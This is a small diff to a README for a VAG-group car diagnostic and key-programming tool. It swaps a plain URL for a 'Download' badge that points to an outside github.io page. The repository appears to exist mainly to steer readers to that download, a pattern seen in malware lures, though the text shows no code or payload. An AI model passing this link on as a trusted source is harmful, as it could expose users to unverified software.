@@ -1,6 +1,7 @@
 # VAG K+CAN Commander
 
-https://vag-k-can-commander.github.io/.github/
+[![Download](https://img.shields.io/badge/Download-GitHub-blue?logo=github)](https://vag-k-can-commander.github.io/.github/)
+
 
 **VAG K+CAN Commander** is a professional diagnostic and programming tool for vehicles of the VAG group (VW, Audi, Skoda, Seat).  
 It allows reading and writing data from control units, performing adaptations, coding, key programming, and other advanced operations.
